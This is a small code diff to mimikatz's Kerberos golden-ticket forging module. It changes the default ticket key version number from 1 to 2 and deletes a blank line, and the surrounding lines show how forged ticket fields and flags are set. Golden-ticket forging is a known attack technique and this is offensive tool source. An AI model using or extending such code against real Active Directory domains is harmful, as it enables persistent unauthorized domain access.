@@ -422,7 +422,6 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 	PKERB_ECRYPT pCSystem;
 	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
 	
-
 	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket." MIMIKATZ_KERBEROS_EXT);
 	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 	{
@@ -609,7 +608,7 @@ PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWST
 	RtlInitUnicodeString(&ticket.DomainName, domainname);
 	ticket.TargetDomainName = ticket.AltTargetDomainName = ticket.DomainName;
 	ticket.TicketFlags = (servicename ? 0 : KERB_TICKET_FLAGS_initial) | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable;
-	ticket.TicketKvno = rodc ? (0x00000001 | (rodc << 16)) : 1; // windows does not care about it...
+	ticket.TicketKvno = rodc ? (0x00000001 | (rodc << 16)) : 2; // windows does not care about it...
 	ticket.TicketEncType = ticket.KeyType = keyType;
 	ticket.Key.Length = keySize;
 	if(ticket.Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket.Key.Length))
